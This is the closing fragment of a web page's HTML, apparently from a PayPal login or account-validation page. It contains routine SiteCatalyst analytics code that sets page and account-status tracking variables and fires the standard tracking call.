<script type="text/javascript">
<!--
/* SiteCatalyst Variables */
s.prop1="p/acc/validate";
s.prop6="4BU036765K570853C";
s.prop7="Premier";
s.prop8="Verified";
s.prop9="Restricted";
s.prop10="US";
s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
s.pageName="p/acc/validate::_login-submit";
s.prop50="en_US";
s.prop18="";
/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
var s_code=s.t();if(s_code)document.write(s_code)//--></script>
<script type="text/javascript"><!--
if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
//-->
</script><noscript><img
src=""
height="1" width="1" border="0" alt="" /></noscript>
<!--/DO NOT REMOVE/-->

<!-- End SiteCatalyst Code -->
</body></html>
